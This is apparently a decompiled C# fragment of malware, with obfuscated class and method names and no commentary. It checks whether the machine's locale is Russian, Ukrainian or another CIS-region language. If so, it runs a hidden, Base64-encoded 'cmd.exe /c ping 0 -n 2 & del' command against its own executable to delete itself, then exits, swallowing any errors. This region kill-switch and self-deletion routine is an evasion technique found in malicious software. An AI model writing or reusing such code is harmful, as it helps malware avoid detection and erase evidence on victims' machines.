using System;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using A;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace ns4;

public class GClass4
{
	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static void smethod_0()
	{
		try
		{
			if (C.A() == 1058 || C.A() == 1059 || C.A() == 1064 || C.A() == 1067 || C.A() == 1079 || C.A() == 1087 || C.A() == 1088 || C.A() == 1090 || C.A() == 1092 || C.A() == 2092 || C.A() == 2115 || C.A() == 1049 || C.A() == 1026 || C.A() == 1091 || C.A() == 1123 || C.A() == 1133)
			{
				Interaction.Shell(C.A(Convert.FromBase64String("Y21kLmV4ZSAvYyBwaW5nIDAgLW4gMiAmIGRlbCA=")) + "\"" + Application.get_ExecutablePath() + "\"", (AppWinStyle)0, false, -1);
				ProjectData.EndApp();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
